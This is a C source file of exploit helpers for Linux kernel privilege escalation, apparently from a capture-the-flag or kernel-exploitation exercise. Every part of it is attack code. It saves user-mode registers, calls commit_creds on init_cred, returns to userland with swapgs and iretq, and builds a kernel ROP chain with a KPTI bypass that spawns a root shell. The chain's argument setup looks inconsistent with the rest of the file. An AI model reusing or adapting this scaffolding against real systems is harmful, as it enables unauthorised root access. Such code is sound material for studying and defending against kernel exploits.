#include <unistd.h>

#include "util.h"
#include "vars.h"

void spawn_root_shell(void) {
    uid_t uid = getuid();
    if (uid != 0) {
        log_error("failed to get root (uid: %d)", uid);
        exit(1);
    }
    log_success("got root (uid = 0)");
    log_info("spawning shell");
    char *argv[] = {"/bin/sh", NULL};
    char *envp[] = {NULL};
    execve("/bin/sh", argv, envp);
    fatal("execve");
}

void save_state(void) {
    log_info("saving user cs, ss, rsp, and rflags");
    asm volatile(
        ".intel_syntax noprefix;"
        "mov %0, cs;"
        "mov %1, ss;"
        "mov %2, rsp;"
        "pushfq;"
        "pop %3;"
        ".att_syntax;"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_sp), "=r"(user_flags)
        :
        : "memory");
    log_with_prefix("     ", "user_cs     = 0x%016lx", user_cs);
    log_with_prefix("     ", "user_flags  = 0x%016lx", user_flags);
    log_with_prefix("     ", "user_sp     = 0x%016lx", user_sp);
    log_with_prefix("     ", "user_ss     = 0x%016lx", user_ss);
}

void restore_state(void) {
    log_success("restoring state");
    if (user_sp == 0) {
        log_error("please call save_state in advance");
        exit(EXIT_FAILURE);
    }
    asm volatile(
        ".intel_syntax noprefix;"
        "swapgs;"
        "mov QWORD PTR [rsp + 0x20], %0;"
        "mov QWORD PTR [rsp + 0x18], %1;"
        "mov QWORD PTR [rsp + 0x10], %2;"
        "mov QWORD PTR [rsp + 0x08], %3;"
        "mov QWORD PTR [rsp + 0x00], %4;"
        "iretq;"
        ".att_syntax;"
        :
        : "r"(user_ss), "r"(user_sp), "r"(user_flags), "r"(user_cs), "r"(spawn_root_shell));
}

void escalate_privilege(void) {
    log_success("escalating privilege");
    void (*cc)(char *) = (void *)(addr_commit_creds);
    (*cc)((char *)addr_init_cred);
    restore_state();
}

void krop(u64 *ptr) {
    *ptr++ = pop_rdi_ret;
    *ptr++ = addr_commit_creds;
    *ptr++ = bypass_kpti;
    *ptr++ = 0xdeadbeef;
    *ptr++ = 0xcafebabe;
    *ptr++ = (u64)spawn_root_shell;
    *ptr++ = user_cs;
    *ptr++ = user_flags;
    *ptr++ = user_sp;
    *ptr++ = user_ss;
}
